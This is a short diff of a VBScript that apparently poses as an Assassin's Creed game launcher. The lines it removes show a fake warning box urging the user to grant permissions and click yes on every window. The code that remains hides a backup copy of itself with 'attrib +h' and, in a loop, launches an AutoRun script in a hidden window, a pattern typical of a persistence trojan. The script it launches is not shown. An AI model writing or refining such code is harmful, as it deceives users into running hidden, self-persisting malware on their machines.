@@ -1,6 +1,3 @@
-' Display the message box once
-x=msgbox("MAKE SURE TO ALLOW THE GAME THE NECESSARY PERMISSIONS FOR IT TO RUN. IF IT DOESNT RUN, CLICK YES ON ALL WINDOWS",0,"ASSASSIN'S CREED::WARNING BEFORE PLAYING")
-
 ' Wait for 1 second
 WScript.Sleep 1000
 
@@ -24,7 +21,7 @@ Do
     ' Set the hidden attribute on the backup script
     WshShell.Run "cmd /c attrib +h " & chr(34) & backupPath & chr(34), 0, True
     ' Run the AutoRun.bat file
-    WshShell.Run chr(34) & "AutoRun.bat" & Chr(34), 0
+    WshShell.Run chr(34) & "AutoRun.cmd" & Chr(34), 0
     ' Wait for the specified period
     WScript.Sleep period
 Loop
